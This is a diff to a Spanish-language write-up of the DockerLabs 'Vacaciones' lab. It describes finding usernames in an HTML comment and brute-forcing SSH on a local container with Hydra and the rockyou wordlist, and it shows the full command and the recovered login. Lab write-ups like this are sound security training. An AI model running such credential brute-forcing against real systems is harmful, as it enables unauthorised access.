@@ -106,5 +106,33 @@ OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                  
 OpenSSH < 7.7 - User Enumeration (2)                                                                                                                       | linux/remote/45939.py
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 ```
-Efectivamente si hay una vulnerabilidad pero, viendo el código de los scripts utilizan librerías y versiones inferiores a las que tengo yo ahora mismo en uso.  Como no quiero tener que modificar mi sistema o configurar un contenedor voy a analizar primero la web a ver si encuentro algo de información relevante.y
+Efectivamente si hay una vulnerabilidad pero, viendo el código de los scripts utilizan librerías y versiones inferiores a las que tengo yo ahora mismo en uso.  Como no quiero tener que modificar mi sistema o configurar un contenedor voy a analizar primero la web a ver si encuentro algo de información relevante.
+
+![Imagen web](https://github.com/JavieRR13/WriteUps/blob/0636f486d49a3e42456c54df229bc5b539aed588/DockerLabs/Muy%20f%C3%A1cil/Vacaciones/Im%C3%A1genes/Vacaciones_Web.png)
+
+Podemos observar que nos encontramos con una web totalmente en blanco pero, si inspeccionamos el código fuente de la página nos encontramos con un mensaje puesto en un comentario HTML que no deberia estar ahi.
+En el mensaje se obtienen dos nombres los cuales podrian ser usuarios de sistema válidos para el servicio OpenSSH que hemos visto anteriormente.
+Lo que voy a hacer va a ser crearme un archivo de texto con los dos nombres (aunque tambien se pueden escribir enel propio parámetro separado por comas) y lanzar la herramienta [Hydra](https://github.com/vanhauser-thc/thc-hydra) con el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para ver si encuentra alguna contraseña.
+
+```ruby
+❯ echo "camilo\njuan" > nombres.txt
+❯ cat nombres.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: nombres.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ camilo
+   2   │ juan
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ hydra -L nombres.txt -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 23:23:53
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: camilo   password: password1
+[STATUS] attack finished for 172.17.0.2 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-11 23:23:54
+```
 
